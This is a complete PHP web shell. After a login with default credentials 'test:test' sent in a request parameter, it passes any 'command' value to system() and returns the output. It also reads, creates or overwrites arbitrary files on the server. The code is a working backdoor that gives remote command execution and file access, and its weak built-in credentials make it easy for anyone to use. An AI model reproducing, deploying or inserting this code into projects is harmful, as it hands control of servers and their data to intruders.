<?php
session_start();
$cmd = $_REQUEST['command'];
$username="test";   //******change this**********
$password="test";   //******change this**********
if($cmd[0]=='@')
{
	if(substr($cmd,1)==$username.":".$password){
		$_SESSION['loggin']="true";
		echo "session begin--";
	}
}
if($cmd[0]=='~')
{
	session_destroy();
	echo "session end--";
}
if(isset($_SESSION['loggin'])==true&&$_SESSION['loggin']=="true")
{
	$code = rawurldecode($_POST['code']);
	if($cmd[0]=='!'){
		$subCmd = substr($cmd,1);
		$loc=getLoc($subCmd);
		$var=substr($subCmd,$loc+1);
		switch(substr($subCmd,0,$loc))
		{
			case "read":{
				$file=fopen($var,"r");
				$stream = fread($file,filesize($var));
				fclose($file);
				echo $stream;
				break;
			}	
			case "new":{
				$file=fopen($var,"x");
				fclose($file);
				echo "done!";			
				break;
			}
			case "write":{
				if(isset($_POST['code'])){
					backup($var);
					$file=fopen($var,"w");
					fwrite($file,$code);
					fclose($file);
				}		
			}
		}
	}
	else{
		ob_start();
		system("$cmd");
		$str = ob_get_contents();
		ob_end_clean();
		echo $str;
		
	}
}
//-SUBROUTINES-----------------
function getLoc($input){
	for($i=0;$i<strlen($input);$i++){
		if($input[$i]==' '){
			return $i;
		}	
	}

}
function backup($fname)
{
	ob_start();
	$bkName=$fname;
	if(strpos($fname,"/")!=false)
	{
		$bkName=str_replace("/","_",$bkName);
	}

	$fdest = fopen("restorehub/$bkName","w");
	$fsrc = fopen("$fname","r");
	$src=fread($fsrc,filesize("$fname"));
	fwrite($fdest,$src);
	fclose($fsrc);
	fclose($fdest);
	ob_end_clean();
}
//-End of Subroutines------------
?>
